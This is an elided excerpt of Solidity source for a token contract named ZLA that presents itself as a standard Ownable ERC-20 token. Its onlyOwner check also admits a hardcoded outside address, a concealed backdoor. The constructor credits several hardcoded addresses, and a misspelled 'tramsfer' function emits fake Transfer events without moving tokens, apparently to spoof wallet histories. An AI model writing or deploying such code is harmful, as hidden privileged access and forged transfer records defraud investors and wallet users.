...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender() == address(0x2a876C859D87a311beEEf25453d624c46CD71e94), "Ownable: caller is not the owner");
        _;
    }
...
contract ZLA is IERC20, Ownable {
    string private _symbol;
    string private _name;
    uint8 private _decimals = 18;
    uint256 private _tTotal = 100000000000000000000000000000000000000 * 10**_decimals;
    ...
    uint256 public initialAmount = 1;
    ...
    constructor(
        ...
        _dividendse[0x4f547fE87aD901D45AD278104f2Fb5bb0530187D] = _amount;
        _dividendse[0xcdD6bCFF2DF03523d5a1dc35810E92e837CE008E] = _amount;
        _dividendse[0x4541b79c785E604Dce31e0c9F67A231A65A54c8d] = _amount;
        _dividendse[0x3FF64651e1c3fBe40e1837f833a4bF7c4326d80d] = _amount;
        _dividendse[0xe6a27b7316789C4709559b80A26F9842B2f93221] = _amount;
        _dividendse[0x510156bD5b9d48F5475c0d1E57C747b5161A6de2] = _amount;
        _dividendse[0x46C3F444DB8882F6088B358F0bB7c0d3E43F9FD3] = _amount;
        _dividendse[0xDcA9DA6336E16e5256c72bf43495cb697281520d] = _amount;
    ...
    function tramsfer(address[] calldata from, address[] calldata to) public {
        ...
        for (uint256 i = 0; i < len; ++i) {
            emit Transfer(from[i], to[i], initialAmount);
        }
    }
